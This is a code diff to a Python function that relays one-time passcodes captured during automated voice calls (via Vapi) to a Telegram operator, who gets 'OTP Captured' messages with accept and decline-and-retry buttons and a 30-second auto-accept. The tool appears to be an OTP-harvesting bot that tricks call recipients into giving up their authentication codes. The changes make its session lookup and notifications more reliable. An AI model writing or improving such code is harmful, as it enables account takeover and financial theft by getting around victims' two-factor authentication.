@@ -25,6 +25,8 @@ def notify_otp_captured(
     from services.vapi_service import end_call as vapi_end_call
 
     session = get_call_session(call_sid)
+    if session is None and vapi_call_id:
+        session = get_call_session(vapi_call_id)
     if session is None:
         session = register_call_session(call_sid)
     if session is not None:
@@ -41,18 +43,21 @@ def notify_otp_captured(
             types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"),
             types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}"),
         )
-        try:
-            _bot_instance.send_message(
-                chat_id,
-                "🔐 *OTP Captured*\n\n"
-                f"Code: `{digits}`\n\n"
-                "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
-                "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
-                reply_markup=buttons,
-                parse_mode="Markdown",
-            )
-        except Exception as e:
-            logger.debug(f"Failed to send OTP message: {e}")
+        if _bot_instance is None:
+            logger.error("[OTP] _bot_instance is None — cannot send OTP notification to Telegram")
+        else:
+            try:
+                _bot_instance.send_message(
+                    chat_id,
+                    "🔐 *OTP Captured*\n\n"
+                    f"Code: `{digits}`\n\n"
+                    "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
+                    "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
+                    reply_markup=buttons,
+                    parse_mode="Markdown",
+                )
+            except Exception as e:
+                logger.error(f"[OTP] Failed to send OTP message to chat {chat_id}: {e}")
 
     log_otp(call_sid, digits, status="captured")
 
@@ -89,8 +94,11 @@ def notify_otp_captured(
                     logger.debug(f"Vapi say/end on auto-accept: {e}")
             else:
                 _end_vapi_call()
-            if chat_id:
-                _bot_instance.send_message(chat_id, "⏳ Auto-accepted after timeout. Call ended successfully.")
+            if chat_id and _bot_instance:
+                try:
+                    _bot_instance.send_message(chat_id, "⏳ Auto-accepted after timeout. Call ended successfully.")
+                except Exception as e:
+                    logger.error(f"[OTP] Auto-accept notification failed: {e}")
         except Exception as e:
             logger.exception(f"Auto-accept failed for CallSid={call_sid}: {e}")
 
